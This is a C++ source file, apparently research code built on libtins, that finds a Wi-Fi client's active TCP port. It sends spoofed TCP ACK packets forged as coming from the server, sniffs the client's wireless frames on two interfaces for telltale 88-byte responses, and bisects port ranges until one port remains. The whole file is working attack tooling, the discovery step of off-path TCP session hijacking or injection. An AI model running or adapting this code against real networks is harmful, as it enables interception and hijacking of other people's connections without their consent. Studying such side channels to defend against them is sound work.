#include "PortFinder.h"
#include <iostream>
#include <fstream>
#include <tins/tins.h>
#include <vector>
#include <deque>
#include <chrono>
#include <random>
#include <thread>
#include <algorithm>

using namespace Tins;

void PortFinder::capturePackets_1(std::vector<Packet>& pkts_1) {
    SnifferConfiguration config;
    config.set_filter("wlan addr1 " + client_mac);
    config.set_immediate_mode(true);
    Sniffer sniffer(sniff_if_name[0], config);

    auto s_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::milliseconds(100);
    while (std::chrono::high_resolution_clock::now()-s_time < duration) {
        Packet packet=sniffer.next_packet();
        pkts_1.push_back(packet);
    }

}

void PortFinder::capturePackets_2(std::vector<Packet>& pkts_2) {
    SnifferConfiguration config;
    config.set_filter("wlan addr1 " + client_mac);
    config.set_immediate_mode(true);
    Sniffer sniffer(sniff_if_name[1], config);

    auto s_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::milliseconds(100);
    while (std::chrono::high_resolution_clock::now()-s_time < duration) {
        Packet packet=sniffer.next_packet();
        pkts_2.push_back(packet);
    }

}

void PortFinder::handle_packets(const std::vector<Packet> pkts){
    target_frame_num = 0;
    
    for(const auto& packet : pkts){
        
        if(packet.pdu()->find_pdu<Dot11QoSData>()){
            if(packet.pdu()->find_pdu<RawPDU>()){
                if (packet.pdu()->rfind_pdu<RawPDU>().size() == 88){
                    target_frame_num += 1;
                    return;
                }   
            }

        }

    }
}

void PortFinder::check_port_list(const std::vector<uint16_t>& port_list) {

    if (port_list.empty()) {
        target_frame_num = 0;
        std::cout << "[*] Warning: the port list is empty" << std::endl;
        return;
    }
    
    std::vector<IP> send_list;
    for (uint16_t p : port_list) {
        for (int i=0; i<packet_repeat; ++i){
            IP packet_1 = IP(server_ip, client_ip) / TCP(server_port, p) / RawPDU("AAA");
            TCP &tcp_1 = packet_1.rfind_pdu<TCP>();
            tcp_1.set_flag(TCP::ACK, true);
            tcp_1.seq(0);

            IP packet_2 = IP(server_ip, client_ip) / TCP(server_port, p) / RawPDU("AAA");
            TCP &tcp_2 = packet_2.rfind_pdu<TCP>();
            tcp_2.set_flag(TCP::ACK, true);
            tcp_2.seq(1<<31);

            send_list.emplace_back(packet_1);
            send_list.emplace_back(packet_2);
        }
    }

    send_num += send_list.size();
    for (const IP& pkt : send_list) {
        send_byte += pkt.size();
    }

    //First sniff Wi-Fi card
    std::vector<Packet> pkts_1;
    PortFinder sniff_object;
    std::thread sniffer_thread_1(&PortFinder::capturePackets_1, &sniff_object, std::ref(pkts_1));

    //Second sniff Wi-Fi card
    std::vector<Packet> pkts_2;
    PortFinder sniff_object_2;
    std::thread sniffer_thread_2(&PortFinder::capturePackets_2, &sniff_object_2, std::ref(pkts_2));


    PacketSender sender;

    for(auto pkt : send_list){
        sender.send(pkt, send_if_name);
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(100));

    /* Avoid long sniffing time due to loss of probe packets/responses */
    std::string add_ip = "8.8.8.8";
    IP add_packet = IP(client_ip, add_ip) / TCP(1234, 4321) / RawPDU("AAAAA");
    TCP &tcp = add_packet.rfind_pdu<TCP>();
    tcp.set_flag(TCP::ACK, true);

    for (int i =0; i<4; i++) {
        sender.send(add_packet, send_if_name);
    }

    sniffer_thread_1.join();
    sniffer_thread_2.join();

    /* Merge sniffed Wi-Fi frames */
    pkts_1.insert(pkts_1.end(), pkts_2.begin(), pkts_2.end());

    handle_packets(pkts_1);
}

void PortFinder::find_port() {
    std::cout << "++++++++++ Try to find the connection port ++++++++++" << std::endl;
    
    while (!stop) {
        std::vector<uint16_t> port_list={};
        
        if (candidate_deque.empty() && port_range_end) {
            stop = true;
        }

        if (candidate_deque.size()) {
            Candidate candidate = candidate_deque[0];
            
            auto current_time = std::chrono::system_clock::now();
            if (current_time - candidate.time > std::chrono::seconds(repeat_time)) {
                port_list = candidate.port_list;
                candidate_deque.pop_front();
                std::cout << "[+] Check the candidate list again and the candidate queue length is " << candidate_deque.size() << std::endl;
            }
        }

        if (port_list.empty()) {
            uint16_t s_p = current_port;
            uint16_t e_p;

            if(end_port-current_port <= step_size){
                e_p = end_port;
            }
            else{
                e_p = current_port+step_size;
            }
            current_port = e_p;

            if (current_port >= end_port) {
                port_range_end = true;
            }
            
            for (uint16_t p = s_p; p < e_p; ++p) {
                port_list.push_back(p);
            }
        }

        if (!port_list.empty()) {
            check_port_list(port_list);
            
            if (target_frame_num > 0) {
                std::cout << "[+] Find a suspicious port range" << std::endl;
                std::vector<uint16_t> suspicious_port_list = port_list;
                int sus_list_len = suspicious_port_list.size();
                int mid = sus_list_len / 2;
                int list_start_len = port_list.size();
                int list_end_len = list_start_len;
                std::vector<uint16_t> candidate_list;
                std::vector<uint16_t> suspicious_left(suspicious_port_list.begin(), suspicious_port_list.begin() + mid);
                std::vector<uint16_t> suspicious_right(suspicious_port_list.begin() + mid, suspicious_port_list.end());
                int double_port = 0;

                while (sus_list_len > 1) {
                    list_end_len = suspicious_port_list.size();

                    std::cout << "[+] Suspicious port range length " << list_end_len << std::endl;

                    candidate_list = suspicious_port_list;
                    suspicious_port_list.clear();
                    check_port_list(suspicious_left);
                    if (target_frame_num > 0) {
                        suspicious_port_list.insert(suspicious_port_list.end(), suspicious_left.begin(), suspicious_left.end());
                    }
                    
                    check_port_list(suspicious_right);
                    if (target_frame_num > 0) {
                        suspicious_port_list.insert(suspicious_port_list.end(), suspicious_right.begin(), suspicious_right.end());
                    }
                    
                    sus_list_len = suspicious_port_list.size();
                    mid = sus_list_len / 2;
                    suspicious_left = std::vector<uint16_t>(suspicious_port_list.begin(), suspicious_port_list.begin() + mid);
                    suspicious_right = std::vector<uint16_t>(suspicious_port_list.begin() + mid, suspicious_port_list.end());

                    if (sus_list_len == list_end_len) {
                        if (double_port >= 5) {
                            suspicious_left.clear();
                            double_port = 0;
                            std::cout << "[#] This port range include two client port" << std::endl;
                        }
                    }
                }

                if (sus_list_len == 1) {
                    result = suspicious_port_list[0];
                    std::cout << "[+] Find the client port: " << result << std::endl;
                    stop = true;
                }
                else {
                    if (list_end_len < list_start_len) {
                        auto time_now = std::chrono::system_clock::now();
                        candidate_deque.emplace_back(candidate_list, time_now);
                        std::cout << "[+] Add a candidate, the candidate queue length is " << candidate_deque.size() << std::endl;
                    }
                    else {
                        std::cout << "[-] Not the real port range" << std::endl;
                    }
                }
            }
        }
    }
}

void PortFinder::write_data(){
    std::ofstream file("port_data.txt", std::ios::app);

    if (!file.is_open()){
        std::cerr << "Cannot open file!" << std::endl;
        return ;
    }

    file << cost_time << " " << send_rate << " " << send_byte << " " << send_num << std::endl;
    file.close();

    return ;
}

void PortFinder::run() {
    auto time_start = std::chrono::system_clock::now();
    
    current_port = start_port;
    stop = false;
    send_num = 0;
    send_byte = 0;
    cost_time = 0;
    result = -1;
    find_port();
    
    auto time_end = std::chrono::system_clock::now();
    cost_time = std::chrono::duration<double>(time_end - time_start).count();
    send_rate = static_cast<double>(send_byte) / cost_time;
    
    std::cout << "Find the client port: " << result << std::endl;
    std::cout << "Send Packets: " << send_num << std::endl;
    std::cout << "Send Bytes: " << send_byte << " (Bytes)" << std::endl;
    std::cout << "Cost Time: " << cost_time << " (s)" << std::endl;
    std::cout << "Send Rate: " << send_rate << " (Byte/s)" << std::endl;
}
